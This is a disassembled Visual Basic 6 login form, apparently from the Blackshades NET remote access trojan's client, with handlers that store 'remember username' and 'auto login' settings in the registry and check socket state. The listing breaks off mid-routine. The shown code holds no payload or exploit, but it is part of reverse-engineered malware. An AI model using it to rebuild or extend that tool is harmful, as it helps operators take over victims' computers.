VERSION 5.00
Begin VB.Form frmLogin
  Caption = "Log in - Blackshades NET"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  BorderStyle = 1 'Fixed Single
  Icon = "frmLogin.frx":0
  LinkTopic = "Form1"
  MaxButton = 0   'False
  MinButton = 0   'False
  ClientLeft = 45
  ClientTop = 375
  ClientWidth = 5190
  ClientHeight = 2805
  StartUpPosition = 2 'CenterScreen
  Begin VB.Timer tmrSocketCheck
    Interval = 5000
    Left = 720
    Top = 0
  End
  Begin VB.CheckBox chkRememberUser
    Caption = "&Remember username"
    Left = 240
    Top = 1440
    Width = 2295
    Height = 255
    TabIndex = 6
    BeginProperty Font
      Name = "Arial"
      Size = 8,25
      Charset = 0
      Weight = 400
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
  End
  Begin VB.CheckBox chkAutoLogin
    Caption = "&Auto login"
    Left = 240
    Top = 1800
    Width = 2295
    Height = 255
    TabIndex = 5
    BeginProperty Font
      Name = "Arial"
      Size = 8,25
      Charset = 0
      Weight = 400
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
  End
  Begin VB.TextBox txtUsername
    BackColor = &HE0E0E0&
    Left = 1680
    Top = 720
    Width = 3375
    Height = 375
    TabIndex = 2
    MaxLength = 320
    BeginProperty Font
      Name = "Arial"
      Size = 11,25
      Charset = 0
      Weight = 400
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
    Appearance = 0 'Flat
  End
  Begin MSWinsockLib.Winsock sckLocal
  End
  Begin VB.Timer tmrTimeout
    Enabled = 0   'False
    Interval = 8000
    Left = 480
    Top = 0
  End
  Begin VB.Timer tmrEncryption
    Enabled = 0   'False
    Interval = 8000
    Left = 720
    Top = 0
  End
  Begin MSWinsockLib.Winsock sckConnect
  End
  Begin VB.Timer Timer3
    Interval = 3000
    Left = 1560
    Top = 0
  End
  Begin VB.Timer Timer2
    Enabled = 0   'False
    Interval = 400
    Left = 120
    Top = 0
  End
  Begin XtremeSkinFramework.SkinFramework SF1
  End
  Begin XtremeSuiteControls.PushButton cmdLogin
    Left = 3360
    Top = 1680
    Width = 1695
    Height = 375
    TabIndex = 0
  End
  Begin VB.Label lblStatus
    Caption = "Status: Awaiting user input!"
    Left = 240
    Top = 2400
    Width = 4695
    Height = 255
    TabIndex = 4
    BackStyle = 0 'Transparent
    BeginProperty Font
      Name = "Arial"
      Size = 8,25
      Charset = 0
      Weight = 700
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
  End
  Begin VB.Image Image
    Index = 0
    Picture = "frmLogin.frx":8E79
    Left = 120
    Top = 720
    Width = 240
    Height = 240
  End
  Begin VB.Label Label
    Caption = "&Username:"
    Index = 1
    Left = 480
    Top = 720
    Width = 1095
    Height = 255
    TabIndex = 3
    BackStyle = 0 'Transparent
    BeginProperty Font
      Name = "Arial"
      Size = 9,75
      Charset = 0
      Weight = 700
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
  End
  Begin VB.Image Image
    Index = 2
    Picture = "frmLogin.frx":8F7B
    Left = 3120
    Top = 240
    Width = 240
    Height = 240
  End
  Begin VB.Label Label
    Caption = "Your credentials"
    Index = 0
    Left = 3480
    Top = 240
    Width = 1575
    Height = 255
    TabIndex = 1
    BackStyle = 0 'Transparent
    BeginProperty Font
      Name = "Arial"
      Size = 9,75
      Charset = 0
      Weight = 700
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
  End
  Begin VB.Shape Shape
    Index = 1
    BackColor = &HC0C0C0&
    BorderColor = &H808080&
    Left = 120
    Top = 2325
    Width = 4935
    Height = 375
    BorderStyle = 0 'Transparent
    FillColor = &HC0C0C0&
    FillStyle = 0
  End
End

Attribute VB_Name = "frmLogin"


Private sub chkAutoLogin__811908
00811908: push ebp
00811909: mov ebp, esp
0081190B: sub esp, 0000000Ch
0081190E: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00811913: mov eax, fs:[00h]
00811919: push eax
0081191A: mov fs:[00000000h], esp
00811921: push 00000064h
00811923: pop eax
00811924: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00811929: push ebx
0081192A: push esi
0081192B: push edi
0081192C: mov var_0C, esp
0081192F: mov var_08, 0040A928h
00811936: mov eax, [ebp+08h]
00811939: and eax, 00000001h
0081193C: mov var_04, eax
0081193F: mov eax, [ebp+08h]
00811942: and al, FEh
00811944: mov [ebp+08h], eax
00811947: mov eax, [ebp+08h]
0081194A: mov eax, [eax]
0081194C: push [ebp+08h]
0081194F: call [eax+04h]
00811952: mov eax, [ebp+08h]
00811955: mov eax, [eax]
00811957: push [ebp+08h]
0081195A: call [eax+00000304h]
00811960: push eax
00811961: lea eax, var_2C
00811964: push eax
00811965: call 00410A84h ; Set (object)
0081196A: mov var_58, eax
0081196D: lea eax, var_50
00811970: push eax
00811971: mov eax, var_58
00811974: mov eax, [eax]
00811976: push var_58
00811979: call [eax+000000E0h]
0081197F: fclex 
00811981: mov var_5C, eax
00811984: cmp var_5C, 00000000h
00811988: jnl 8119A4h
0081198A: push 000000E0h
0081198F: push 00440DF8h
00811994: push var_58
00811997: push var_5C
0081199A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081199F: mov var_74, eax
008119A2: jmp 8119A8h
008119A4: and var_74, 00000000h
008119A8: xor eax, eax
008119AA: cmp word ptr var_50, 0000h
008119AF: setz al
008119B2: neg eax
008119B4: mov var_60, ax
008119B8: lea ecx, var_2C
008119BB: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008119C0: movsx eax, word ptr var_60
008119C4: test eax, eax
008119C6: jz 00811A7Eh
008119CC: and word ptr var_50, 0000h
008119D1: mov edx, 00445AC4h ; frmMain
008119D6: lea ecx, var_1C
008119D9: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008119DE: mov edx, 00445A90h ; 10012C02021D0E13092812
008119E3: lea ecx, var_18
008119E6: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008119EB: lea eax, var_50
008119EE: push eax
008119EF: lea eax, var_1C
008119F2: push eax
008119F3: lea eax, var_18
008119F6: push eax
008119F7: call 007AA622h
008119FC: mov edx, eax
008119FE: lea ecx, var_24
00811A01: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00811A06: mov var_44, 0044D754h ; Auto
00811A0D: mov var_4C, 00000008h
00811A14: mov var_34, 0044D744h ; Login
00811A1B: mov var_3C, 00000008h
00811A22: mov eax, var_24
00811A25: mov var_6C, eax
00811A28: and var_24, 00000000h
00811A2C: push 00000010h
00811A2E: pop eax
00811A2F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00811A34: lea esi, var_4C
00811A37: mov edi, esp
00811A39: movsd 
00811A3A: movsd 
00811A3B: movsd 
00811A3C: movsd 
00811A3D: push 00000010h
00811A3F: pop eax
00811A40: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00811A45: lea esi, var_3C
00811A48: mov edi, esp
00811A4A: movsd 
00811A4B: movsd 
00811A4C: movsd 
00811A4D: movsd 
00811A4E: mov edx, var_6C
00811A51: lea ecx, var_20
00811A54: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00811A59: push eax
00811A5A: call 00410C2Eh ; DeleteSetting(arg_1, arg_2, arg_3)
00811A5F: lea eax, var_24
00811A62: push eax
00811A63: lea eax, var_20
00811A66: push eax
00811A67: lea eax, var_1C
00811A6A: push eax
00811A6B: lea eax, var_18
00811A6E: push eax
00811A6F: push 00000004h
00811A71: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00811A76: add esp, 00000014h
00811A79: jmp 00811B6Ch
00811A7E: and word ptr var_50, 0000h
00811A83: mov edx, 00445AC4h ; frmMain
00811A88: lea ecx, var_1C
00811A8B: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00811A90: mov edx, 00445A90h ; 10012C02021D0E13092812
00811A95: lea ecx, var_18
00811A98: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00811A9D: lea eax, var_50
00811AA0: push eax
00811AA1: lea eax, var_1C
00811AA4: push eax
00811AA5: lea eax, var_18
00811AA8: push eax
00811AA9: call 007AA622h
00811AAE: mov edx, eax
00811AB0: lea ecx, var_28
00811AB3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00811AB8: mov eax, [ebp+08h]
00811ABB: mov eax, [eax]
00811ABD: push [ebp+08h]
00811AC0: call [eax+00000304h]
00811AC6: push eax
00811AC7: lea eax, var_2C
00811ACA: push eax
00811ACB: call 00410A84h ; Set (object)
00811AD0: mov var_58, eax
00811AD3: lea eax, var_54
00811AD6: push eax
00811AD7: mov eax, var_58
00811ADA: mov eax, [eax]
00811ADC: push var_58
00811ADF: call [eax+000000E0h]
00811AE5: fclex 
00811AE7: mov var_5C, eax
00811AEA: cmp var_5C, 00000000h
00811AEE: jnl 811B0Ah
00811AF0: push 000000E0h
00811AF5: push 00440DF8h
00811AFA: push var_58
00811AFD: push var_5C
00811B00: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00811B05: mov var_78, eax
00811B08: jmp 811B0Eh
00811B0A: and var_78, 00000000h
00811B0E: mov eax, var_28
00811B11: mov var_70, eax
00811B14: and var_28, 00000000h
00811B18: push var_54
00811B1B: call 00410964h ; msvbvm60.dll.__vbaStrI2
00811B20: mov edx, eax
00811B22: lea ecx, var_24
00811B25: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00811B2A: push eax
00811B2B: push 0044D754h ; Auto
00811B30: push 0044D744h ; Login
00811B35: mov edx, var_70
00811B38: lea ecx, var_20
00811B3B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00811B40: push eax
00811B41: call 00410838h ; SaveSetting(arg_1,arg_2,arg_3,arg_4)
00811B46: lea eax, var_28
00811B49: push eax
00811B4A: lea eax, var_24
00811B4D: push eax
00811B4E: lea eax, var_20
00811B51: push eax
00811B52: lea eax, var_1C
00811B55: push eax
00811B56: lea eax, var_18
00811B59: push eax
00811B5A: push 00000005h
00811B5C: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00811B61: add esp, 00000018h
00811B64: lea ecx, var_2C
00811B67: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00811B6C: mov var_04, 00000000h
00811B73: push 00811BA2h
00811B78: jmp 811BA1h
00811B7A: lea eax, var_28
00811B7D: push eax
00811B7E: lea eax, var_24
00811B81: push eax
00811B82: lea eax, var_20
00811B85: push eax
00811B86: lea eax, var_1C
00811B89: push eax
00811B8A: lea eax, var_18
00811B8D: push eax
00811B8E: push 00000005h
00811B90: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00811B95: add esp, 00000018h
00811B98: lea ecx, var_2C
00811B9B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00811BA0: ret 
End Sub

Private sub chkRememberUser__811BC1
00811BC1: push ebp
00811BC2: mov ebp, esp
00811BC4: sub esp, 0000000Ch
00811BC7: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00811BCC: mov eax, fs:[00h]
00811BD2: push eax
00811BD3: mov fs:[00000000h], esp
00811BDA: push 00000060h
00811BDC: pop eax
00811BDD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00811BE2: push ebx
00811BE3: push esi
00811BE4: push edi
00811BE5: mov var_0C, esp
00811BE8: mov var_08, 0040A938h
00811BEF: mov eax, [ebp+08h]
00811BF2: and eax, 00000001h
00811BF5: mov var_04, eax
00811BF8: mov eax, [ebp+08h]
00811BFB: and al, FEh
00811BFD: mov [ebp+08h], eax
00811C00: mov eax, [ebp+08h]
00811C03: mov eax, [eax]
00811C05: push [ebp+08h]
00811C08: call [eax+04h]
00811C0B: mov eax, [ebp+08h]
00811C0E: mov eax, [eax]
00811C10: push [ebp+08h]
00811C13: call [eax+00000300h]
00811C19: push eax
00811C1A: lea eax, var_2C
00811C1D: push eax
00811C1E: call 00410A84h ; Set (object)
00811C23: mov var_54, eax
00811C26: lea eax, var_50
00811C29: push eax
00811C2A: mov eax, var_54
00811C2D: mov eax, [eax]
00811C2F: push var_54
00811C32: call [eax+000000E0h]
00811C38: fclex 
00811C3A: mov var_58, eax
00811C3D: cmp var_58, 00000000h
00811C41: jnl 811C5Dh
00811C43: push 000000E0h
00811C48: push 00440DF8h
00811C4D: push var_54
00811C50: push var_58
00811C53: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00811C58: mov var_70, eax
00811C5B: jmp 811C61h
00811C5D: and var_70, 00000000h
00811C61: xor eax, eax
00811C63: cmp word ptr var_50, 0000h
00811C68: setz al
00811C6B: neg eax
00811C6D: mov var_5C, ax
00811C71: lea ecx, var_2C
00811C74: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00811C79: movsx eax, word ptr var_5C
00811C7D: test eax, eax
00811C7F: jz 00811D37h
00811C85: and word ptr var_50, 0000h
00811C8A: mov edx, 00445AC4h ; frmMain
00811C8F: lea ecx, var_1C
00811C92: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00811C97: mov edx, 00445A90h ; 10012C02021D0E13092812
00811C9C: lea ecx, var_18
00811C9F: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00811CA4: lea eax, var_50
00811CA7: push eax
00811CA8: lea eax, var_1C
00811CAB: push eax
00811CAC: lea eax, var_18
00811CAF: push eax
00811CB0: call 007AA622h
00811CB5: mov edx, eax
00811CB7: lea ecx, var_24
00811CBA: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00811CBF: mov var_44, 00446744h ; Username
00811CC6: mov var_4C, 00000008h
00811CCD: mov var_34, 0044D744h ; Login
00811CD4: mov var_3C, 00000008h
00811CDB: mov eax, var_24
00811CDE: mov var_68, eax
00811CE1: and var_24, 00000000h
00811CE5: push 00000010h
00811CE7: pop eax
00811CE8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00811CED: lea esi, var_4C
00811CF0: mov edi, esp
00811CF2: movsd 
00811CF3: movsd 
00811CF4: movsd 
00811CF5: movsd 
00811CF6: push 00000010h
00811CF8: pop eax
00811CF9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00811CFE: lea esi, var_3C
00811D01: mov edi, esp
00811D03: movsd 
00811D04: movsd 
00811D05: movsd 
00811D06: movsd 
00811D07: mov edx, var_68
00811D0A: lea ecx, var_20
00811D0D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00811D12: push eax
00811D13: call 00410C2Eh ; DeleteSetting(arg_1, arg_2, arg_3)
00811D18: lea eax, var_24
00811D1B: push eax
00811D1C: lea eax, var_20
00811D1F: push eax
00811D20: lea eax, var_1C
00811D23: push eax
00811D24: lea eax, var_18
00811D27: push eax
00811D28: push 00000004h
00811D2A: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00811D2F: add esp, 00000014h
00811D32: jmp 00811E15h
00811D37: and word ptr var_50, 0000h
00811D3C: mov edx, 00445AC4h ; frmMain
00811D41: lea ecx, var_1C
00811D44: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00811D49: mov edx, 00445A90h ; 10012C02021D0E13092812
00811D4E: lea ecx, var_18
00811D51: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00811D56: lea eax, var_50
00811D59: push eax
00811D5A: lea eax, var_1C
00811D5D: push eax
00811D5E: lea eax, var_18
00811D61: push eax
00811D62: call 007AA622h
00811D67: mov edx, eax
00811D69: lea ecx, var_28
00811D6C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00811D71: mov eax, [ebp+08h]
00811D74: mov eax, [eax]
00811D76: push [ebp+08h]
00811D79: call [eax+00000308h]
00811D7F: push eax
00811D80: lea eax, var_2C
00811D83: push eax
00811D84: call 00410A84h ; Set (object)
00811D89: mov var_54, eax
00811D8C: lea eax, var_20
00811D8F: push eax
00811D90: mov eax, var_54
00811D93: mov eax, [eax]
00811D95: push var_54
00811D98: call [eax+000000A0h]
00811D9E: fclex 
00811DA0: mov var_58, eax
00811DA3: cmp var_58, 00000000h
00811DA7: jnl 811DC3h
00811DA9: push 000000A0h
00811DAE: push 00440E08h
00811DB3: push var_54
00811DB6: push var_58
00811DB9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00811DBE: mov var_74, eax
00811DC1: jmp 811DC7h
00811DC3: and var_74, 00000000h
00811DC7: mov eax, var_28
00811DCA: mov var_6C, eax
00811DCD: and var_28, 00000000h
00811DD1: push var_20
00811DD4: push 00446744h ; Username
00811DD9: push 0044D744h ; Login
00811DDE: mov edx, var_6C
00811DE1: lea ecx, var_24
00811DE4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00811DE9: push eax
00811DEA: call 00410838h ; SaveSetting(arg_1,arg_2,arg_3,arg_4)
00811DEF: lea eax, var_28
00811DF2: push eax
00811DF3: lea eax, var_20
00811DF6: push eax
00811DF7: lea eax, var_24
00811DFA: push eax
00811DFB: lea eax, var_1C
00811DFE: push eax
00811DFF: lea eax, var_18
00811E02: push eax
00811E03: push 00000005h
00811E05: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00811E0A: add esp, 00000018h
00811E0D: lea ecx, var_2C
00811E10: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00811E15: mov var_04, 00000000h
00811E1C: push 00811E4Bh
00811E21: jmp 811E4Ah
00811E23: lea eax, var_28
00811E26: push eax
00811E27: lea eax, var_24
00811E2A: push eax
00811E2B: lea eax, var_20
00811E2E: push eax
00811E2F: lea eax, var_1C
00811E32: push eax
00811E33: lea eax, var_18
00811E36: push eax
00811E37: push 00000005h
00811E39: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00811E3E: add esp, 00000018h
00811E41: lea ecx, var_2C
00811E44: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00811E49: ret 
End Sub

Private sub tmrTimeout__814C0E
00814C0E: push ebp
00814C0F: mov ebp, esp
00814C11: sub esp, 0000000Ch
00814C14: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00814C19: mov eax, fs:[00h]
00814C1F: push eax
00814C20: mov fs:[00000000h], esp
00814C27: push 0000001Ch
00814C29: pop eax
00814C2A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00814C2F: push ebx
00814C30: push esi
00814C31: push edi
00814C32: mov var_0C, esp
00814C35: mov var_08, 0040AB50h
00814C3C: mov eax, [ebp+08h]
00814C3F: and eax, 00000001h
00814C42: mov var_04, eax
00814C45: mov eax, [ebp+08h]
00814C48: and al, FEh
00814C4A: mov [ebp+08h], eax
00814C4D: mov eax, [ebp+08h]
00814C50: mov eax, [eax]
00814C52: push [ebp+08h]
00814C55: call [eax+04h]
00814C58: mov eax, [ebp+08h]
00814C5B: mov eax, [eax]
00814C5D: push [ebp+08h]
00814C60: call [eax+0000030Ch]
00814C66: push eax
00814C67: lea eax, var_18
00814C6A: push eax
00814C6B: call 00410A84h ; Set (object)
00814C70: mov var_1C, eax
00814C73: push 00442930h
00814C78: mov eax, var_1C
00814C7B: mov eax, [eax]
00814C7D: push var_1C
00814C80: call [eax+74h]
00814C83: fclex 
00814C85: mov var_20, eax
00814C88: cmp var_20, 00000000h
00814C8C: jnl 814CA5h
00814C8E: push 00000074h
00814C90: push 00447A20h
00814C95: push var_1C
00814C98: push var_20
00814C9B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00814CA0: mov var_2C, eax
00814CA3: jmp 814CA9h
00814CA5: and var_2C, 00000000h
00814CA9: lea ecx, var_18
00814CAC: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00814CB1: mov eax, [ebp+08h]
00814CB4: mov eax, [eax]
00814CB6: push [ebp+08h]
00814CB9: call [eax+0000030Ch]
00814CBF: push eax
00814CC0: lea eax, var_18
00814CC3: push eax
00814CC4: call 00410A84h ; Set (object)
00814CC9: mov var_1C, eax
00814CCC: push 00000000h
00814CCE: mov eax, var_1C
00814CD1: mov eax, [eax]
00814CD3: push var_1C
00814CD6: call [eax+5Ch]
00814CD9: fclex 
00814CDB: mov var_20, eax
00814CDE: cmp var_20, 00000000h
00814CE2: jnl 814CFBh
00814CE4: push 0000005Ch
00814CE6: push 00447A20h
00814CEB: push var_1C
00814CEE: push var_20
00814CF1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00814CF6: mov var_30, eax
00814CF9: jmp 814CFFh
00814CFB: and var_30, 00000000h
00814CFF: lea ecx, var_18
00814D02: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00814D07: mov var_04, 00000000h
00814D0E: push 00814D1Fh
00814D13: jmp 814D1Eh
00814D15: lea ecx, var_18
00814D18: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00814D1D: ret 
End Sub

Private sub tmrSocketCheck__814AE8
00814AE8: push ebp
00814AE9: mov ebp, esp
00814AEB: sub esp, 0000000Ch
00814AEE: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00814AF3: mov eax, fs:[00h]
00814AF9: push eax
00814AFA: mov fs:[00000000h], esp
00814B01: push 00000024h
00814B03: pop eax
00814B04: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00814B09: push ebx
00814B0A: push esi
00814B0B: push edi
00814B0C: mov var_0C, esp
00814B0F: mov var_08, 0040AB40h
00814B16: mov eax, [ebp+08h]
00814B19: and eax, 00000001h
00814B1C: mov var_04, eax
00814B1F: mov eax, [ebp+08h]
00814B22: and al, FEh
00814B24: mov [ebp+08h], eax
00814B27: mov eax, [ebp+08h]
00814B2A: mov eax, [eax]
00814B2C: push [ebp+08h]
00814B2F: call [eax+04h]
00814B32: push 00000000h
00814B34: push 00000008h
00814B36: mov eax, [ebp+08h]
00814B39: mov eax, [eax]
00814B3B: push [ebp+08h]
00814B3E: call [eax+00000330h]
00814B44: push eax
00814B45: lea eax, var_18
00814B48: push eax
00814B49: call 00410A84h ; Set (object)
00814B4E: push eax
00814B4F: lea eax, var_28
00814B52: push eax
00814B53: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00814B58: add esp, 00000010h
00814B5B: push eax
00814B5C: call 004109D0h ; msvbvm60.dll.__vbaI2Var
00814B61: xor ecx, ecx
00814B63: cmp ax, 0007h
00814B67: setnz cl
00814B6A: neg ecx
00814B6C: xor eax, eax
00814B6E: cmp word ptr [008F2500h], FFFFh
00814B76: setz al
00814B79: neg eax
00814B7B: and cx, ax
00814B7E: mov var_2C, cx
00814B82: lea ecx, var_18
00814B85: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00814B8A: lea ecx, var_28
00814B8D: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00814B92: movsx eax, word ptr var_2C
00814B96: test eax, eax
00814B98: jz 814BCFh
00814B9A: mov eax, [ebp+08h]
00814B9D: mov eax, [eax]
00814B9F: push [ebp+08h]
00814BA2: call [eax+00000734h]
00814BA8: mov var_2C, eax
00814BAB: cmp var_2C, 00000000h
00814BAF: jnl 814BCBh
00814BB1: push 00000734h
00814BB6: push 0044391Ch
00814BBB: push [ebp+08h]
00814BBE: push var_2C
00814BC1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00814BC6: mov var_38, eax
00814BC9: jmp 814BCFh
00814BCB: and var_38, 00000000h
00814BCF: mov var_04, 00000000h
00814BD6: push 00814BEFh
00814BDB: jmp 814BEEh
00814BDD: lea ecx, var_18
00814BE0: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00814BE5: lea ecx, var_28
00814BE8: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00814BED: ret 
End Sub

Private sub Form__8124CE
008124CE: push ebp
008124CF: mov ebp, esp
008124D1: sub esp, 00000018h
008124D4: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008124D9: mov eax, fs:[00h]
008124DF: push eax
008124E0: mov fs:[00000000h], esp
008124E7: mov eax, 00000174h
008124EC: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008124F1: push ebx
008124F2: push esi
008124F3: push edi
008124F4: mov var_18, esp
008124F7: mov var_14, 0040A958h
008124FE: mov eax, [ebp+08h]
00812501: and eax, 00000001h
00812504: mov var_10, eax
00812507: mov eax, [ebp+08h]
0081250A: and al, FEh
0081250C: mov [ebp+08h], eax
0081250F: mov var_0C, 00000000h
00812516: mov eax, [ebp+08h]
00812519: mov eax, [eax]
0081251B: push [ebp+08h]
0081251E: call [eax+04h]
00812521: mov var_04, 00000001h
00812528: mov var_04, 00000002h
0081252F: push FFFFFFFFh
00812531: call 00410A60h ; On Error ...
00812536: mov var_04, 00000003h
0081253D: call 007CD0E3h
00812542: mov edx, eax
00812544: mov ecx, 008F208Ch
00812549: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0081254E: mov var_04, 00000004h
00812555: cmp [008F529Ch], 00000000h
0081255C: jnz 812579h
0081255E: push 008F529Ch
00812563: push 00440F2Ch
00812568: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0081256D: mov var_00000158, 008F529Ch
00812577: jmp 812583h
00812579: mov var_00000158, 008F529Ch
00812583: mov eax, var_00000158
00812589: mov eax, [eax]
0081258B: mov var_000000F8, eax
00812591: lea eax, var_00000088
00812597: push eax
00812598: mov eax, var_000000F8
0081259E: mov eax, [eax]
008125A0: push var_000000F8
008125A6: call [eax+14h]
008125A9: fclex 
008125AB: mov var_000000FC, eax
008125B1: cmp var_000000FC, 00000000h
008125B8: jnl 8125DAh
008125BA: push 00000014h
008125BC: push 00440F1Ch
008125C1: push var_000000F8
008125C7: push var_000000FC
008125CD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008125D2: mov var_0000015C, eax
008125D8: jmp 8125E1h
008125DA: and var_0000015C, 00000000h
008125E1: mov eax, var_00000088
008125E7: mov var_00000100, eax
008125ED: lea eax, var_70
008125F0: push eax
008125F1: mov eax, var_00000100
008125F7: mov eax, [eax]
008125F9: push var_00000100
008125FF: call [eax+50h]
00812602: fclex 
00812604: mov var_00000104, eax
0081260A: cmp var_00000104, 00000000h
00812611: jnl 812633h
00812613: push 00000050h
00812615: push 00440F3Ch
0081261A: push var_00000100
00812620: push var_00000104
00812626: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081262B: mov var_00000160, eax
00812631: jmp 81263Ah
00812633: and var_00000160, 00000000h
0081263A: cmp [008F529Ch], 00000000h
00812641: jnz 81265Eh
00812643: push 008F529Ch
00812648: push 00440F2Ch
0081264D: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00812652: mov var_00000164, 008F529Ch
0081265C: jmp 812668h
0081265E: mov var_00000164, 008F529Ch
00812668: mov eax, var_00000164
0081266E: mov eax, [eax]
00812670: mov var_00000108, eax
00812676: lea eax, var_0000008C
0081267C: push eax
0081267D: mov eax, var_00000108
00812683: mov eax, [eax]
00812685: push var_00000108
0081268B: call [eax+14h]
0081268E: fclex 
00812690: mov var_0000010C, eax
00812696: cmp var_0000010C, 00000000h
0081269D: jnl 8126BFh
0081269F: push 00000014h
008126A1: push 00440F1Ch
008126A6: push var_00000108
008126AC: push var_0000010C
008126B2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008126B7: mov var_00000168, eax
008126BD: jmp 8126C6h
008126BF: and var_00000168, 00000000h
008126C6: mov eax, var_0000008C
008126CC: mov var_00000110, eax
008126D2: lea eax, var_74
008126D5: push eax
008126D6: mov eax, var_00000110
008126DC: mov eax, [eax]
008126DE: push var_00000110
008126E4: call [eax+58h]
008126E7: fclex 
008126E9: mov var_00000114, eax
008126EF: cmp var_00000114, 00000000h
008126F6: jnl 812718h
008126F8: push 00000058h
008126FA: push 00440F3Ch
008126FF: push var_00000110
00812705: push var_00000114
0081270B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00812710: mov var_0000016C, eax
00812716: jmp 81271Fh
00812718: and var_0000016C, 00000000h
0081271F: push var_70
00812722: push 00441B28h
00812727: call 00410A18h ; &
0081272C: mov edx, eax
0081272E: lea ecx, var_78
00812731: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00812736: push eax
00812737: push var_74
0081273A: call 00410A18h ; &
0081273F: mov edx, eax
00812741: lea ecx, var_7C
00812744: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00812749: push eax
0081274A: push 00441A70h ; .exe
0081274F: call 00410A18h ; &
00812754: mov edx, eax
00812756: lea ecx, var_80
00812759: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0081275E: push eax
0081275F: call 007CCF71h
00812764: mov var_00000094, eax
0081276A: mov var_0000009C, 00002011h
00812774: lea eax, var_0000009C
0081277A: push eax
0081277B: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00812780: mov edx, eax
00812782: lea ecx, var_00000084
00812788: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0081278D: push eax
0081278E: call 00872A51h
00812793: mov var_000000A4, eax
00812799: mov var_000000AC, 00000008h
008127A3: lea edx, var_000000AC
008127A9: lea ecx, var_58
008127AC: call 00410922h ; msvbvm60.dll.__vbaVarMove
008127B1: lea eax, var_00000084
008127B7: push eax
008127B8: lea eax, var_80
008127BB: push eax
008127BC: lea eax, var_7C
008127BF: push eax
008127C0: lea eax, var_74
008127C3: push eax
008127C4: lea eax, var_78
008127C7: push eax
008127C8: lea eax, var_70
008127CB: push eax
008127CC: push 00000006h
008127CE: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008127D3: add esp, 0000001Ch
008127D6: lea eax, var_0000008C
008127DC: push eax
008127DD: lea eax, var_00000088
008127E3: push eax
008127E4: push 00000002h
008127E6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008127EB: add esp, 0000000Ch
